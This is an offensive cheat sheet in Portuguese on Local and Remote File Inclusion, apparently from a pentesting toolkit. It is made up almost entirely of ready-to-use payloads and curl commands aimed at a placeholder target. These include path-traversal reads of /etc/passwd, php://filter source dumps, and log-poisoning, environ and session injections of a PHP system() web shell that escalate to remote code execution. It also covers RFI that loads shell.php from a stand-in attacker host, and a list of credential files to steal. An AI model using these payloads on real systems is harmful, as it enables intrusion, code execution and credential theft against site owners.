# LFI / RFI (Local/Remote File Inclusion)

## LFI — Local File Inclusion

### Como Identificar
```
http://alvo.com/index.php?page=contato
http://alvo.com/app.php?template=home
http://alvo.com/view.php?file=sobre
```

### Payloads Básicos
```
?page=../../../etc/passwd
?page=../../../../etc/passwd
?page=..%2F..%2F..%2Fetc%2Fpasswd
?page=....//....//....//etc/passwd
```

### Windows
```
?page=..\..\..\windows\win.ini
?page=C:\windows\win.ini
```

### Wrappers PHP (para código fonte)
```
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/read=convert.base64-encode/resource=config

# Decodificar o output Base64
echo "Q0ZBTkdFRQ==" | base64 -d
```

## Escalar LFI para RCE

### Via Log Poisoning
```bash
# 1. Injetar payload nos logs do Apache
curl "http://alvo.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 2. Incluir o log via LFI
curl "http://alvo.com/?page=../../../var/log/apache2/access.log&cmd=id"
```

### Via /proc/self/environ
```bash
# Injetar via User-Agent
curl "http://alvo.com/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# Incluir environ
curl "http://alvo.com/?page=/proc/self/environ&cmd=id"
```

### Via PHP Session
```bash
# 1. Injetar código na sessão
curl "http://alvo.com/login.php" --data "user=<?php system('id'); ?>"

# 2. Incluir arquivo de sessão
curl "http://alvo.com/?page=/tmp/sess_SESSID"
```

## RFI — Remote File Inclusion

```
?page=http://atacante.com/shell.php
?page=\\\\atacante.com\\shell.php
?page=ftp://atacante.com/shell.php
```

### Hospedar Shell no Atacante
```bash
# Criar webshell simples
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Servir via HTTP
python3 -m http.server 80

# Testar RFI
curl "http://alvo.com/?page=http://SEU_IP/shell.php&cmd=id"
```

## Detecção com vlad.py

```bash
python vlad.py web --alvo "http://alvo.com/?page=home" --tipo lfi
```

## Arquivos de Alto Valor via LFI

```
/etc/passwd          # Usuários
/etc/shadow          # Hashes (requer root)
/etc/hosts           # Rede interna
/var/www/html/.env   # Credenciais da app
/var/www/html/config.php
/proc/version        # Versão do kernel
/proc/self/environ   # Variáveis de ambiente
```
